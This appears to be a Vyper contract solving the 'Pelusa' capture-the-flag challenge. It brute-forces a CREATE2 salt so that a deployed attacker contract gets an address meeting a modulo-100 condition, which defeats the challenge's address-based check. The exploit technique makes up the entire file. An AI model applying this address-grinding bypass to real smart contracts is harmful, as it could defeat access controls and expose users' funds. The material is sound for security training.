# @version ^0.3.7

hacker: public(address)

@external
@payable
def __init__(
    blueprint_address: address, 
    pelusa: address, 
    bytecode: Bytes[max_value(uint16)], 
):
    bytecode_hash: bytes32 = keccak256(
        concat(
            bytecode,
            convert(pelusa, bytes32),
        )
    )
    salt: bytes32 = self._calculate_salt(bytecode_hash)
    self.hacker = create_from_blueprint(blueprint_address, pelusa, code_offset=3, salt=salt)

@internal
def _calculate_salt(bytecode_hash: bytes32) -> bytes32:
    collision_offset: bytes1 = 0xFF
    salt: uint256 = 0
    for _ in range(max_value(uint8)):
        data: bytes32 = keccak256(concat(collision_offset, convert(self, bytes20), convert(salt, bytes32), bytecode_hash))
        addr: address = convert(convert(data, uint256) & max_value(uint160), address)
        if convert(convert(addr, uint160), uint256) % 100 == 10:
            break
        salt += 1
    return convert(salt, bytes32)

